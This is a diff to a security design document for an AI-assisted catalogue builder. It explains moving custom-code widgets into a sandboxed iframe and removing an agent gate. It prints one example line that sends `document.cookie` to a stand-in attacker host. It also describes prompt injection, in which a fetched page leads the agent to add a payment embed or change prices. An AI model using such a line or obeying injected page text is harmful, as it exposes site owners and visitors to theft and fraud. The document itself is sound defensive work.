@@ -22,7 +22,7 @@ inputs an attacker can choose.
 | Text section `content` | builder, AI | `HtmlContent` → `dangerouslySetInnerHTML` | **Yes** - `text` profile |
 | Catalogue `heading` | builder, AI | `HtmlContent` | **Yes** - `text` profile |
 | `embedding` block `code` | builder, AI | `HtmlContent` | **Yes** - `embed` profile |
-| `custom_code` block `code` | builder, AI | own mount, scripts re-created to execute | **No** - see below |
+| `custom_code` block `code` | builder, AI | sandboxed iframe, opaque origin | **Isolated**, not filtered |
 
 ### The three that are filtered
 
@@ -44,65 +44,72 @@ better: when it blocked a widget it told the model to *"add what you found as a
 text or category section instead"* - routing page-derived content into an
 equally unfiltered sink.
 
-### The one that is not
+### The one that is isolated instead
 
-`custom_code` does not go through `HtmlContent`. `CustomCode.tsx` mounts the
-fragment itself and then **deliberately re-creates every `<script>` node so it
-executes**, because a script inserted via `innerHTML` is inert. That is the
-feature: interactive widgets, games, calculators. Five tests cover it.
+`custom_code` does not go through `HtmlContent` and is not filtered at all. It
+is arbitrary HTML, CSS and JavaScript, and running it is the feature -
+interactive widgets, games, calculators.
 
-**A source-text allowlist cannot secure this.** Inline `<script>` is allowed by
-design, so stripping `<script src>` and `fetch` is cosmetic - one line of inline
-JS defeats it:
+**A source-text allowlist cannot secure that.** Inline `<script>` is the whole
+point, so stripping `<script src>` and `fetch` is cosmetic - one line defeats
+it:
 
 ```js
 new Image().src = "https://evil.example/?c=" + document.cookie;
 ```
 
-There is no filter over JavaScript source that fixes that while still letting
-widgets run. The control has to be isolation, not inspection.
+There is no filter over JavaScript source that fixes this while still letting
+widgets run. So the control is isolation. `CustomCode.tsx` renders the fragment
+into an iframe as `sandbox="allow-scripts"` **without** `allow-same-origin`,
+which gives it an opaque origin.
 
-Which is why `requireNoWebCode` in `agent/session.ts` still stands: after
-`fetchUrl` has run, the agent cannot write `custom_code` or `embedding`. It is
-blunt and it blocks legitimate work - a user asking to build a catalogue from
-their website *and* add a widget gets the widget refused - but with the sink
-unguarded it is the only thing between an injected page and executable markup
-on a live catalogue.
+Verified in Chromium rather than in jsdom, because this is the kind of claim a
+fake DOM will happily agree with:
 
-`embedding` stays gated too, even though it is now filtered. The allowlist
-includes `stripe.com` and `paypal.com`, so an injected page could still get a
-payment iframe pointing at an account the owner does not control onto their
-page. Lower severity than XSS, still fraud.
+| Probe, from inside the frame | Result |
+|---|---|
+| `document.cookie` | threw |
+| `parent.document.title` | threw |
+| `localStorage.setItem` | threw |
+| `iframe.contentDocument`, from the parent | `null` |
+| the widget's own inline script | ran |
+| height reported out, frame resized | 200px → 690px |
+
+**Never add `allow-same-origin`.** Paired with `allow-scripts` it lets the frame
+reach out and remove its own sandbox attribute, which undoes all of the above.
+
+Two things the frame does not inherit, both handled in `buildWidgetDocument`:
+
+- **Height.** An iframe does not size to its content, so the document carries a
+  reporter that posts its height to the parent. The parent matches on
+  `event.source`, not origin - a sandboxed frame posts with origin `"null"`, so
+  origin is worth nothing here. Heights are clamped at 5000px.
+- **Theme.** The catalogue's font is read from the host element and written into
+  the document, along with `--catalogue-font-body` and `--catalogue-font-heading`
+  so a fragment written against them still resolves.
+
+With the fragment isolated, `requireNoWebCode` had nothing left to protect and
+is gone. Reading a page and building a widget in the same conversation works.
 
 ---
 
-## What would close it
+## What is left
 
-Render `custom_code` in a sandboxed iframe:
+**An embed the user never supplied.** `EMBED_HOSTS` restricts which hosts an
+iframe may point at, but not what lives there, and the list includes
+`stripe.com` and `paypal.com`. A page read by `fetchUrl` could in principle talk
+the agent into a payment embed pointing at an account the owner does not
+control.
 
-```html
-<iframe sandbox="allow-scripts" srcdoc="...">
-```
+What stands against it today is prompt-level - `webRules` says a page can never
+be the source of an embed, and payment, booking and checkout embeds especially
+must come from the user - plus the fact that an embed is visible in the builder
+and the owner still presses Publish. That is weaker than a hard gate. If it
+proves too weak, the narrow fix is to refuse `embedding` specifically once
+`fetchUrl` has run in the same request, which is roughly the old gate minus the
+part that blocked widgets.
 
-`allow-scripts` **without** `allow-same-origin` puts the widget in an opaque
-origin: no parent DOM, no cookies, no same-origin credentialed requests. The
-widget still runs; it just cannot reach anything. `requireNoWebCode` then has
-nothing left to protect and can be deleted, which is what unblocks
-"build from my site, and add a widget".
-
-It is not free:
-
-- **Height.** An iframe does not size to its content. Needs a `ResizeObserver`
-  inside posting to the parent over `postMessage` (which works from an opaque
-  origin; the parent matches on `event.source`, not origin).
-- **Theme.** The fragment stops inheriting the catalogue's fonts and CSS
-  variables. They would have to be injected into the `srcdoc`.
-- **Existing widgets.** Anything already published that reads the parent page
-  changes behaviour. The documented `document.currentScript.parentNode` pattern
-  survives - inside the iframe that is still the fragment's own parent - but
-  the five tests in `tests/unit/components/` assert in-page mounting and would
-  be rewritten.
-
-That is a change to how every published catalogue renders widgets, for every
-customer, so it is a decision rather than a cleanup. Until it is made, the gate
-stays and widgets after a page read stay blocked.
+**Content the model gets wrong under injection** - a price changed because a
+page said so, an item nobody asked for. Nothing here addresses that; it is what
+the untrusted-text rules in the prompt are for, and it is a much lower-severity
+outcome than executable markup.
